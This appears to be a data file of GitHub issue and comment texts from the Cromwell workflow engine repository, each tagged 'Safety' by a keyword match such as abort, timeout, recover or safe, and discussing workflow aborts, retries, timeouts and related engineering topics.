[51ee236fcase_gatk_acnv_workflow.HetPulldown:12:1]: job id: 9788; [2016-10-19 18:30:17,05] [info] WorkflowExecutionActor-51ee236f-c31a-48c2-bae7-9246439160b0 [51ee236f]: WorkflowExecutionActor [51ee236f] job aborted: case_gatk_acnv_workflow.HetPulldown:4:; 1; [2016-10-19 18:30:17,10] [warn] WorkflowExecutionActor-51ee236f-c31a-48c2-bae7-9246439160b0 [51ee236f]: WorkflowExecutionActor [51ee236f] received an unhandled message: JobRunning(51ee236f-; c31a-48c2-bae7-9246439160b0:case_gatk_acnv_workflow.HetPulldown:7:1,Some(Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-51ee236f-c31a-48c2-ba; e7-9246439160b0/WorkflowExecutionActor-51ee236f-c31a-48c2-bae7-9246439160b0/51ee236f-c31a-48c2-bae7-9246439160b0-EngineJobExecutionActor-case_gatk_acnv_workflow.HetPulldown:7:1/51ee236f-c31; a-48c2-bae7-9246439160b0-BackendJobExecutionActor-51ee236f:case_gatk_acnv_workflow.HetPulldown:7:1#132070105 ; .... snip....; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600:3758,abort,aborted,3758,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600,1,['abort'],['aborted']
Safety,"If I recall correctly, it was proposed to not follow this route because the state consisted of the child workflow actor references in it, and was used to kill (or maybe abort) the workflow it was executing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-236298310:169,abort,abort,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-236298310,1,['abort'],['abort']
Safety,"If `abort-all-workflows-on-terminate` is true, Cromwell will send a message directly to the WorkflowManagerActor which will trigger jobs to be aborted on the backend side but the workflow store is not made aware of that. Which means on restart, all ""aborted"" workflows will be restarted. Possible fix: instead of going to the WMA directly, send the abort command to the WorkflowStore first like it's done for single workflow abort, and have the WorkflowStore notify the WMA when all workflows have been removed. There might be a race condition between workflow submission and workflow deletion from the store so it might need some carefully ordered messages.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2492:4,abort,abort-all-workflows-on-terminate,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2492,5,['abort'],"['abort', 'abort-all-workflows-on-terminate', 'aborted']"
Safety,"If a java.util.concurrent.ExecutionException, check if it has an inner cause that is actually fatal.; Pre-update to SBT 1.x.; The cromwell multi-project with SBT 1.x consumes a lot of memory. To avoid OOME:; - Bump IntelliJ from 768 to something like 1786.; - Bump .sbtopts to something like 3072. Build updates while prepping fo sbt version bump, including using sbt-doge temporarily for simplified SBT 0.13 cross version build syntax.; DRYed out a bit of the module dependency graph.; Publish hotfix libraries, not just executables.; Replaced deprecated commons-lang with commons-text replacements.; Fixed test class errantly nested within its companion object.; Fixed test that was only liquibasing metadata, and not the original database.; Removed unused TestActorSystem.; Fixed missing test in ""common"".; Removed old ""common"" sbt files.; Cleaner version of assembly.; SwaggerUI injected into the cromwell-version.conf, so it only needs to be editted in one place.; Replaced usage of 'sbt ""project foo"" sometask' with 'sbt foo/sometask'.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2821:195,avoid,avoid,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2821,1,['avoid'],['avoid']
Safety,"If a timeout is not provided, GCP defaults to [setting a timeout of 7 days](https://developers.google.com/resources/api-libraries/documentation/genomics/v2alpha1/java/latest/com/google/api/services/genomics/v2alpha1/model/Pipeline.html), after which the pipeline will abort. Occasionally pipelines genuinely need to run >7 days. These changes allow this value to be user-configured.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5273:5,timeout,timeout,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5273,3,"['abort', 'timeout']","['abort', 'timeout']"
Safety,"If a workflow fails, I would like cromwell to tell me somewhere really obvious, like perhaps the last thing it prints to stdout:. * The first thing that failed.; * Whether it was a failure that occurred while cromwell was running the wdl, or whether it occurred during the execution of a task.; * If a cromwell error, which line of which wdl it happened on.; * If a task, which task and the stderr file. I think a lot of this already exists, but I'm suggesting for it to be super-simple and in one place. . Here's an example of the desired output:. ```; Lots of output. . .; . . .; Your workflow failed while executing task HelloWorld, See cromwell-executions/Hello/c44566iifgg57/call-HelloWorld/execution/stderr for details.; ```. Or. ```; Cromwell failed while executing line 346 of HelloWorld.wdl. The index 6 is out of bounds for the array popular_salutations.; ```. This would be extremely helpful whenever a non-expert runs a workflow, for example our mutect2 wdl. Currently I debug with a mix of home-brewed greps through the cromwell metadata, fishing through cromwell-executions, and running the darn thing myself. It would be really great just to tell them to look at the last line of stdout. A few points:; * The first error is all you need because you can iterate and fix bugs one at a time.; * It's crucial to let the user know very explicitly if this is a cromwell error or a within-task error.; * Stack traces from running the tool could be useful and acceptable, but cromwell stack traces with all that stuff about akka and spark would be overwhelming.; * Rigor isn't important here. For example, the order of execution is not prescribed to the point that the first task to fail will be the same every time, but for this it doesn't matter. Just reporting the first error on the wall clock is sufficient.; * It doesn't matter which workflows, subworkflows etc fails. Just the task.; * Putting this on the last line of stdout has the added virtue of avoiding hassle in a screen session.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3226:1964,avoid,avoiding,1964,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3226,1,['avoid'],['avoiding']
Safety,"If this sounds like a good idea, we probably may be needing more discussions in terms of handling cases like `AbortAllWorkflows`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200579236:110,Abort,AbortAllWorkflows,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200579236,1,['Abort'],['AbortAllWorkflows']
Safety,"If this ticket is about what I think it is (picking up jobs that were running when Cromwell is restarted), I think this ticket should be ""Recover Support"". I believe ""retry"" describes Cromwell's resilience to transient failures with Google Cloud services.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217901703:138,Recover,Recover,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217901703,1,['Recover'],['Recover']
Safety,"Ignore my redundant self-approval of this PR. I intended to click ""merge"" but apparently the green ""Approve"" button was too tempting for me not to click on first",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959:10,redund,redundant,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959,1,['redund'],['redundant']
Safety,"Im testing moving LSAPI runs to Batch with v86, and I keep getting the following error:. textPayload: ""docker: invalid spec: /mnt/disks/cromwell_root:/mnt/disks/cromwell_root:: empty section between colons."". for this command:; Executing runnable container:{image_uri:""gcr.io/google.com/cloudsdktool/cloud-sdk:434.0.0-alpine"" commands:""-c"" commands:""printf '%s %s\\n' \""$(date -u '+%Y/%m/%d %H:%M:%S')\"" Starting\\ container\\ setup."" entrypoint:""/bin/sh"" volumes:""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root:""} timeout:{seconds:300} labels:{key:""logging"" value:""ContainerSetup""} for Task task/job-49cc8a88-722b-43067ba4-ab34-48bc00-group0-0/0/0 in TaskGroup group0 of Job job-49cc8a88-722b-43067ba4-ab34-48bc00. The docker volumes are defined as:; volumes:""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root:""}. Shouldn't there be a rw permissions entry after the last colon? As far as I know, there is no way for users to modify the docker launch config to fix this. Is there something I have malformed or missing in my conf file?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7408:518,timeout,timeout,518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7408,1,['timeout'],['timeout']
Safety,"Implement a JES PBE, this ticket covers the basics but should NOT include:; - retry support; - call caching support; - recovery support; - metadata support; - abort support. as these are covered in other tickets with the ""JES PBE""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/657:119,recover,recovery,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/657,2,"['abort', 'recover']","['abort', 'recovery']"
Safety,Implement recover in TES and improve abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4197:10,recover,recover,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4197,2,"['abort', 'recover']","['abort', 'recover']"
Safety,Implement recoverAsync for AWS backend [BA-4857],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216:10,recover,recoverAsync,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216,1,['recover'],['recoverAsync']
Safety,"In PR #2925, the `no_new_calls` test sometimes generates a cromwell log [message](https://github.com/broadinstitute/cromwell/blob/c6ed64617c51c572863b87d324fa8e68fa085b1a/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L118-L121):. > Cromwell server was restarted while this workflow was running. As part of the restart process, Cromwell attempted to reconnect to this job, however it was never started in the first place. This is a benign failure and not the cause of failure for this workflow, it can be safely ignored. This occurs when cromwell is restarted while `shouldSucceed` is still running. `shouldSucceed` finishes, and then a `Restarting calls: no_new_calls.delayedTask:NA:1` is generated, even though `boundToFail` has already failed and NoNewCalls should be started. The easiest way to reproduce this locally and see the delay is to increase the sleep in the wdl from 100 to something like 300 (five minutes). FYI if cromwell is not restarted, `delayedTask` does not start, does not fail, and does not have a metadata stanza for the call.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2926:554,safe,safely,554,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2926,1,['safe'],['safely']
Safety,"In [CROM-6338](https://broadworkbench.atlassian.net/browse/CROM-6338) Denis reports that Cromwell is unexpectedly failing to retry 503s and provides the following sample error:; ```; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""503 Service Unavailable\nBackend Error""; }; ],; ""message"": ""Could not read from gs://broad-epi-cromwell/workflows/ChipSeq/ce6a5671-baf6-4734-a32b-abf3d9138e9b/call-epitope_classifier/memory_retry_rc: 503 Service Unavailable\nBackend Error""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://broad-epi-cromwell/workflows/ChipSeq/ce6a5671-baf6-4734-a32b-abf3d9138e9b/call-epitope_classifier/memory_retry_rc: 503 Service Unavailable\nBackend Error""; }; ]; ```. In https://github.com/broadinstitute/cromwell/issues/6154 @freeseek reports that Cromwell is unexpectedly failing to retry 504s and provides the following sample error:; ```; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media"",; ""causedBy"": []; }; ],; ""message"": ""Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=me",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6155:993,Timeout,Timeout,993,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155,1,['Timeout'],['Timeout']
Safety,"In a configuration like. ```wdl; workflow ifs_in_scatters {; call hello. scatter (n in range(5)) {; if (true) {; call goodbye { input: i = hello.out }; }; }; }; ```; When the conditional graph is created, all nodes outside of the scatter get ""wrapped"" in an `OuterGraphInputNode` that gets passed into the inner conditional graph so that nodes in the inner graph can reference nodes outside of the scatter.; The issue is that those OGINs are created with `preserveScatterIndex = true` even though the node they're pointing to is outside of the scatter. This was preventing the `ExecutionStore` from detecting the `i = hello.out` expression as being runnable because it was looking for a `hello.out` node in `Done` state at index `n`, which doesn't exist since `call hello` is outside the scatter.; This PR changes that to use the `preserveIndexForOuterLookups ` value of the conditional / scatter instead, which in this case will be `false`, because the scatter node does set `preserveScatterIndex = false` to build its inner graph (in this case the if).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3158:599,detect,detecting,599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3158,1,['detect'],['detecting']
Safety,"In addition to the akka migration docs, and the commented out implicit compilation error, there a several new compilation warnings / recommendations that appeared with this change. They each look straightforward enough to fix and quiet, in a following PR or this PR. While we're in there, perhaps we can also use [`""com.timushev.sbt"" % ""sbt-updates""`](https://github.com/rtimush/sbt-updates) to update our other dependencies in cromwell, lenthall, and wdl4s, too. Btw, the explicit form that compiles your implict error:. ``` scala; val futureAny = actorRef.?(message)(timeout = timeout, sender = actorRef); ```. Switch `timeout` and `actorRef` with whatever `implicit val` you intended, but those were the closest in scope from `trait DefaultTimeout` and the enclosing method parameters, respectively.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1370#issuecomment-244788823:569,timeout,timeout,569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1370#issuecomment-244788823,3,['timeout'],['timeout']
Safety,"In fact, I now have more running jobs than I had when I issued the abort signal.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-254901155:67,abort,abort,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-254901155,1,['abort'],['abort']
Safety,"In order to de-risk a time-sensitive deployment, I am staging this as an option",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5351:15,risk,risk,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5351,1,['risk'],['risk']
Safety,"In order to fix the coverage I am willing to write tests. But I need some explanation on how to configure the cromwell that is used by centaur, so I can set `exit-code-timeout-seconds`. Can somebody give me that? Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-496377749:168,timeout,timeout-seconds,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-496377749,1,['timeout'],['timeout-seconds']
Safety,In particular the behavior for `Timeout` is indirectly tested currently by CromwellApiServiceSpec. Test this behavior directly in the (currently nonexistent) CromwellServerActorSpec instead,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1829:32,Timeout,Timeout,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1829,1,['Timeout'],['Timeout']
Safety,In response to:. * Issue with being too generous in production https://broadworkbench.atlassian.net/browse/PROD-137; * The (hopefully) safe but low sanity limit introduced in https://github.com/broadinstitute/firecloud-develop/pull/1652. AC: We should be able to:; * Perf test various values for this field in a repeatable way; * Make sure we don't regress on the level we find; * Set the production value to something more informed than just a wild guess,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4990:135,safe,safe,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4990,1,['safe'],['safe']
Safety,"In situations where a workflow is being restarted, receives an abort command but is only at materialization stage or initialization stage we currently assume it's ok to stop right here and declare it `Aborted`. This assumption is wrong as jobs are probably running and we need to re-connect to them so we can 1) abort them 2) update their status.; In the same vein, if a workflow is in the workflow store waiting to be restarted and gets aborted, we need to still pick it up and reconnect to jobs to abort them.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2829:63,abort,abort,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2829,5,"['Abort', 'abort']","['Aborted', 'abort', 'aborted']"
Safety,In the course of responding to a bug report with Abort @mcovarr quickly found several other related bugs in Abort which points to the fact that we should have better testing of the Abort endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1396:49,Abort,Abort,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1396,3,['Abort'],['Abort']
Safety,Increase connection pool timeout for unit tests,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4525:25,timeout,timeout,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4525,1,['timeout'],['timeout']
Safety,"Inspired by stuff I've seen on other projects, e.g. https://github.com/atom/atom/blob/master/CONTRIBUTING.md. I believe Github will detect this file and show a little ""read this first"" indicator when opening a pull request: https://github.blog/2012-09-17-contributing-guidelines/. This is potentially a team discussion broader than ""two thumbs & merge"".",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4922:132,detect,detect,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4922,1,['detect'],['detect']
Safety,"Instrumentation was scheduled on a timer out of band of the actor's thread, and in some cases accessing non thread safe state inside the actor (in a read only fashion but still it can cause incoherent values: https://stackoverflow.com/questions/37690525/multiple-threads-checking-map-size-and-conccurency); Instead use messages to self to schedule instrumentation on the actor's thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4402:115,safe,safe,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4402,1,['safe'],['safe']
Safety,Intended to avoid multiple people iterating on this having to regenerate the same set of placeholders:; - Project definition in sbt; - Basic ecs backend factory; - Better defaults in the BackendLifecycleActorFactory trait; - Fixed a few typos in nearby files... 😳,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1563:12,avoid,avoid,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1563,1,['avoid'],['avoid']
Safety,Investigate unused abort registration in CallActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/464:19,abort,abort,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/464,1,['abort'],['abort']
Safety,"Is the idea that we can sum up the jobs run per group and then we have the total # of jobs running?. I think this is sufficient, but I'd still like to add logging to job token manager in addition to this, even if nothing more than a sanity check on the numbers we're seeing here. Assuming the first part is true, by all means merge!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4567#issuecomment-457693674:233,sanity check,sanity check,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4567#issuecomment-457693674,1,['sanity check'],['sanity check']
Safety,"Is there a typo in the better behavior? Should the job continue WITH; relocalizing (since the input.bam file is partially copied?. On Fri, Sep 16, 2016 at 11:20 AM, kshakir notifications@github.com wrote:. > The zeroth localizers checks to see if a file exists before re-localizing.; > The copy localizer should therefore copy-to-temp-then-rename.; > ; > Current broken behavior:; > - Run SGE task with a large input.bam and copy localization; > - Cromwell starts copying to <call_root>/input.bam; > - Kill the job during localization; > - Restart cromwell; > - Cromwell detects the partial <call_root>/input.bam exists.; > - The job continues without relocalizing.; > ; > Better behavior:; > - Run SGE task with a large input.bam and copy localization; > - Cromwell starts copying to <call_root>/input.bam.tmp; > - Kill the job during localization; > - Restart cromwell; > - Cromwell doesn't detects the partial <call_root>/input.bam exists.; > - The job continues without relocalizing.; > ; > And when cromwell isn't killed:; > - Run SGE task with a large input.bam and copy localization; > - Cromwell starts copying to <call_root>/input.bam.tmp, ensuring to; > overwrite previous results; > - When copying finishes rename <call_root>/input.bam.tmp to; > <call_root>/input.bam; > - The job continues; > ; > NOTE: Most people do not like copying inputs anyway, so this hasn't been a; > major issue.; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1426, or mute the; > thread; > https://github.com/notifications/unsubscribe-auth/ABW4g1ZnxF4tyJPhaY4gsjrShn6qz9Vyks5qqrOxgaJpZM4J_DUj; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1426#issuecomment-247630452:571,detect,detects,571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1426#issuecomment-247630452,2,['detect'],['detects']
Safety,Is there a way to detect whether my program is running as part of a Cromwell task?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5235:18,detect,detect,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5235,1,['detect'],['detect']
Safety,Is this kind of redundant to the token system?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370562042:16,redund,redundant,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370562042,1,['redund'],['redundant']
Safety,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:582,avoid,avoid,582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457,1,['avoid'],['avoid']
Safety,"It allows a user to understand that they're requesting to abort something which is already terminal. Whether or not that's useful is a matter of debate. Clearly someone does because it was put in by someone. I say that it's ""useful"" but am using quotes because I doubt anyone is ever going to act on knowledge. I don't recall if it returns 200 or just a generic error (I could dig it up if it matters, but not now as I don't have the energy and I don't think we should keep it)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332683379:58,abort,abort,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332683379,1,['abort'],['abort']
Safety,"It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference, Cromwell errors out and refuses to proceed with a similar message in both cases. But it seems like a good move anyway. With `SafeConstructor`:. `java -jar /Users/anichols/Projects/cromwell/server/target/scala-2.12/cromwell-70-1a6c161-SNAP.jar run test3.cwl`; ```; could not determine a constructor for the tag tag:yaml.org,2002:javax.script.ScriptEngineManager; ```. With `Constructor`:. `java -jar cromwell-69.jar run test3.cwl`:; ```; could not determine a constructor for the tag '!!javax.script.ScriptEngineManager'; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510:47,Safe,SafeConstructor,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510,2,['Safe'],['SafeConstructor']
Safety,"It seemed to go like this in FC:. - Cromwell received some workflows in a batch; - [...] some unknown amount of time passed; - `abort` was run on the remaining workflows; - Some workflows aborted fine (but always took at least 2 `abort` calls to abort); - Others returned 404s; - It's unknown whether these also took 2 `abort` calls to abort, and only the second returned 404. Because rawls is retrying on any error, these `abort` calls are now chewing up a lot of Cromwell resource unnecessarily",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4497:128,abort,abort,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4497,7,['abort'],"['abort', 'aborted']"
Safety,It seems that @TMiguelT has already addressed part of [this issue](https://github.com/hpcng/singularity/issues/2597). . The singularity cache is not meant as a replacement for storing your images. It is merely meant as a way to avoid downloading too much. . It seems we have to hack something together in bash or contribute something upstream. I think bash hacking can be fairly succesful but it will be very ugly. The requirements for the cache:; * Make use of singularity's layer cache to avoid too much downloading.; * Should be thread safe. Singularity 3.6.0 commands will use a threadsafe cache. Older version will have to use a universal file lock.; * Will put all `.sif` images in a single shared location.; * Will check if a file exists before pulling. This will mean a cache-first approach. Internet outages should not affect workflows that have already run several times.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844:228,avoid,avoid,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844,3,"['avoid', 'safe']","['avoid', 'safe']"
Safety,"It was taking 12-14 seconds between the time the GetStatus message was received by the ServiceRegistryActor and the time it was received by the EngineMetadataServiceActor. All sorts of other test stuff was executing in the interim, but the timeout for status queries previously defaulted to 10 seconds so that wasn't going to work. Added an explicit ~~30~~ 60 second ~~dilated~~ timeout as in many other spots.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1057#issuecomment-227978006:240,timeout,timeout,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1057#issuecomment-227978006,2,['timeout'],['timeout']
Safety,"It will take me a while to dig up an online reference (googling java thread safety returns a ton of results to sort through). But creating one's own private lock is an extra level of paranoia, kind of like marking all java variables as `final`, or reducing the scope of classes to `private`. If one uses `this` as a mutex, then others can actually steal your lock, by locking **you**. ```scala; object LiquibaseUtils {; def echoQuick = {; this.synchronized {; println(""hello""); }; }; }. object ForeignImplementation {; LiquibaseUtils.synchronized {; // I have your lock!; Thread.sleep(1.day.toMillis); }; }; ```. If however the synchronization is done on a private variable, it can never be shared by outside participants. ```scala; object LiquibaseUtils {; private val cantTouchThis = new Object; def echoQuick = {; cantTouchThis.synchronized {; println(""hello""); }; }; }. object ForeignImplementation {; LiquibaseUtils.synchronized {; // Doesn't affect echoQuick; Thread.sleep(1.day.toMillis); }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439099381:76,safe,safety,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439099381,1,['safe'],['safety']
Safety,"It would be a nice feature, particularly for folks with a single large box,; but it is not something that I see myself using regularly, to be honest. On Fri, Sep 29, 2017 at 5:16 PM, Kate Voss <notifications@github.com> wrote:. > @seandavi <https://github.com/seandavi> are you still interested in being; > able to limit CPU and memory when running on local?; > @geoffjentry <https://github.com/geoffjentry> what would be the effort; > and risk for adding these parameters?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333241117>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAFpE2iSooOX2P5Vj9bQYMoikzonywc7ks5snV4YgaJpZM4N9Ob6>; > .; >. -- ; Sean Davis, MD, PhD; Center for Cancer Research; National Cancer Institute; National Institutes of Health; Bethesda, MD 20892; https://seandavi.github.io/; https://twitter.com/seandavis12",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333242232:440,risk,risk,440,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333242232,1,['risk'],['risk']
Safety,"It would be a really nice to have feature indeed!. In addition to what was said above, we're also planning to work on runtime metrics reporting at DSP hackathon with @mohawkTrail and @rexwangcc . In the future, the ""automatic retry"" feature could enable us to collect runtime statistics much more easily (in a fully automated fashion). From this, we could then build accurate models on how much resources are actually needed, for a given set of inputs (so we could predict the amount of resources for future workflows, instead of relying on guesswork or retries). Without this feature, we have to either overshoot the amount of resources uniformly for all tasks (and then collect how much they actually need), or somehow retry this in a ""ladder"" fashion using an automated script that does a ""parameter sweep"" that we then pass to our workflow as inputs (or directly edit using something like MiniWDL perhaps?).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-515629279:465,predict,predict,465,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-515629279,1,['predict'],['predict']
